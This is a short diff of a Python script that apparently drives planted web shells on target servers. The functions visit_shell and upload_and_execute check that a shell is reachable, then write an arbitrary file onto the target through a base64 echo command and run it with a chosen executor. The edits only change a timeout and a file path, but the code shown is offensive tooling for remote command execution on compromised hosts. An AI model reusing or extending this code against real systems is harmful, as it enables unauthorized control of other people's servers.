@@ -135,7 +135,7 @@ def visit_shell(target,target_port,cmd):
     shell_arg = hashlib.md5(shell_salt_2 + target).hexdigest()
     if headers.has_key('Content-Length'):
 	del(headers['Content-Length'])
-    res = requests.get("http://" + target + ":" + str(target_port) + shell_path + "/"  + shell_name,timeout=2,headers=headers)
+    res = requests.get("http://" + target + ":" + str(target_port) + shell_path + "/"  + shell_name,timeout=timeout,headers=headers)
     if res.status_code==200:
 	res.close()
 	return True
@@ -148,7 +148,7 @@ def upload_and_execute(target,target_port,cmd):
         upload_file_name = raw_input('The file to upload:')
 	executor = raw_input('The executor:')
 	U_A_E_flag = 1
-    contents = open(upload_file_name).read()
+    contents = open("./script/" + upload_file_name).read()
     contents = base64.b64encode(contents)
     cmd = '/bin/echo %s | /usr/bin/base64 -d | /bin/cat > %s/%s'%(contents , shell_absolute_path , upload_file_name)
     cmd += ';' + executor
